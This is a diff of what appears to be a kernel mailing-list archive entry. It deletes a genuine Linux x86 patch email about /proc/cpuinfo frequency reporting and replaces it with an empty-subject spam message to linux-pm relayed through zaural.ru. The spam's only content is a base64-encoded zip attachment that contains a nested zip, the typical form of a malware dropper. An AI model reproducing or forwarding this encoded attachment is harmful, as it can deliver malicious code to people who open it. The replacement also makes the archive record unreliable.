@@ -1,96 +1,74 @@
-From: Len Brown <lenb@kernel.org>
-Subject: [PATCH 1/5] x86: do not use cpufreq_quick_get() for /proc/cpuinfo "cpu MHz"
-Date: Wed,  7 Jun 2017 19:39:12 -0700
-Message-ID: <f9250362b5eb66bc34402c1fd175f9db7a841532.1496889051.git.len.brown@intel.com>
-References: <1496889556-17923-1-git-send-email-lenb@kernel.org>
-Reply-To: Len Brown <lenb@kernel.org>
-Return-path: <linux-kernel-owner@vger.kernel.org>
-In-Reply-To: <1496889556-17923-1-git-send-email-lenb@kernel.org>
-Sender: linux-kernel-owner@vger.kernel.org
-To: x86@kernel.org, srinivas.pandruvada@linux.intel.com, hpa@linux.intel.com, peterz@infradead.org, rafael@kernel.org
-Cc: linux-pm@vger.kernel.org, linux-kernel@vger.kernel.org, Len Brown <len.brown@intel.com>
+From: <kgbok.kezyhumh@murad.com>
+Subject: (unknown)
+Date: Thu, 08 Jun 2017 03:14:56 -0000
+Message-ID: <149689169680.29695.7502398649855876625@zaural.ru>
+Mime-Version: 1.0
+Content-Type: application/zip; name="522358304980.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-pm-owner@vger.kernel.org>
+Received: from ws160.zone31-163-168.zaural.ru ([31.163.168.160]:55484 "HELO
+        zaural.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751444AbdFHDPB (ORCPT <rfc822;linux-pm@vger.kernel.org>);
+        Wed, 7 Jun 2017 23:15:01 -0400
+Subject: 
+Content-Disposition: attachment
+Sender: linux-pm-owner@vger.kernel.org
 List-Id: linux-pm@vger.kernel.org
+To: linux-pm@vger.kernel.org
 
-From: Len Brown <len.brown@intel.com>
-
-cpufreq_quick_get() allows cpufreq drivers to over-ride cpu_khz
-that is otherwise reported in x86 /proc/cpuinfo "cpu MHz".
-
-There are four problems with this scheme,
-any of them is sufficient justification to delete it.
-
-1. Depending on which cpufreq driver is loaded, the behavior
-   of this field is different.
-
-2. Distros complain that they have to explain to users
-   why and how this field changes.  Distros have requested a constant.
-
-3. The two major providers of this information, acpi_cpufreq
-   and intel_pstate, both "get it wrong" in different ways.
-
-   acpi_cpufreq lies to the user by telling them that
-   they are running at whatever frequency was last
-   requested by software.
-
-   intel_pstate lies to the user by telling them that
-   they are running at the average frequency computed
-   over an undefined measurement.  But an average computed
-   over an undefined interval, is itself, undefined...
-
-4. On modern processors, user space utilities, such as
-   turbostat(1), are more accurate and more precise, while
-   supporing concurrent measurement over arbitrary intervals.
-
-Users who have been consulting /proc/cpuinfo to
-track changing CPU frequency will be dissapointed that
-it no longer wiggles -- perhaps being unaware of the
-limitations of the information they have been consuming.
-
-Yes, they can change their scripts to look in sysfs
-cpufreq/scaling_cur_frequency.  Here they will find the same
-data of dubious quality here removed from /proc/cpuinfo.
-The value in sysfs will be addressed in a subsequent patch
-to address issues 1-3, above.
-
-Issue 4 will remain -- users that really care about
-accurate frequency information should not be using either
-proc or sysfs kernel interfaces.
-They should be using using turbostat(8), or a similar
-purpose-built analysis tool.
-
-Signed-off-by: Len Brown <len.brown@intel.com>
----
- arch/x86/kernel/cpu/proc.c | 10 ++--------
- 1 file changed, 2 insertions(+), 8 deletions(-)
-
-diff --git a/arch/x86/kernel/cpu/proc.c b/arch/x86/kernel/cpu/proc.c
-index 6df621a..218f798 100644
---- a/arch/x86/kernel/cpu/proc.c
-+++ b/arch/x86/kernel/cpu/proc.c
-@@ -2,7 +2,6 @@
- #include <linux/timex.h>
- #include <linux/string.h>
- #include <linux/seq_file.h>
--#include <linux/cpufreq.h>
- 
- /*
-  *	Get CPU information for use by the procfs.
-@@ -76,14 +75,9 @@ static int show_cpuinfo(struct seq_file *m, void *v)
- 	if (c->microcode)
- 		seq_printf(m, "microcode\t: 0x%x\n", c->microcode);
- 
--	if (cpu_has(c, X86_FEATURE_TSC)) {
--		unsigned int freq = cpufreq_quick_get(cpu);
--
--		if (!freq)
--			freq = cpu_khz;
-+	if (cpu_has(c, X86_FEATURE_TSC))
- 		seq_printf(m, "cpu MHz\t\t: %u.%03u\n",
--			   freq / 1000, (freq % 1000));
--	}
-+			   cpu_khz / 1000, (cpu_khz % 1000));
- 
- 	/* Cache size */
- 	if (c->x86_cache_size >= 0)
--- 
-2.7.4
+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
+TgAAAOULAAAAAA==
